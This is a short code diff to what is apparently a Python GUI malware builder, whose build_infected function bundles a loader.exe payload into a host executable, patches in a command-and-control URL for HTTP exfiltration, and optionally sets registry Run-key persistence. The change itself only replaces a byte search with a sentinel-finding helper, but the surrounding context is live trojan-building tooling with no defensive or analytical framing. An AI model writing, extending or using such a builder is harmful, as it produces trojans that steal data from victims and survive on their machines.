@@ -15,6 +15,8 @@ import json, os, shutil, struct, subprocess, sys, threading, time
 import tkinter as tk
 from tkinter import filedialog, ttk
 
+from peutil import find_sentinel
+
 HERE = os.path.dirname(os.path.abspath(__file__))
 BIN  = os.path.join(HERE, "bin")
 LOADER = os.path.join(BIN, "loader.exe")
@@ -319,7 +321,7 @@ def build_infected(host_path, c2_url="", persist=False, log=print):
             host_bytes = real_host
     # Patch C2 URL into the payload embedded in the loader
     if c2_url:
-        sidx = loader_bytes.find(C2_SENTINEL)
+        sidx = find_sentinel(loader_bytes, C2_SENTINEL, 256)
         if sidx == -1:
             log("[!] C2 sentinel not found in loader -- no HTTP exfiltration")
         else:
@@ -329,7 +331,7 @@ def build_infected(host_path, c2_url="", persist=False, log=print):
             log("[+] C2 URL embedded: %s" % c2_url)
     # Patch persistence sentinel if enabled
     if persist:
-        pidx = loader_bytes.find(PERSIST_SENTINEL)
+        pidx = find_sentinel(loader_bytes, PERSIST_SENTINEL, 8)
         if pidx != -1:
             loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
             log("[+] persistence: enabled (registry Run key)")
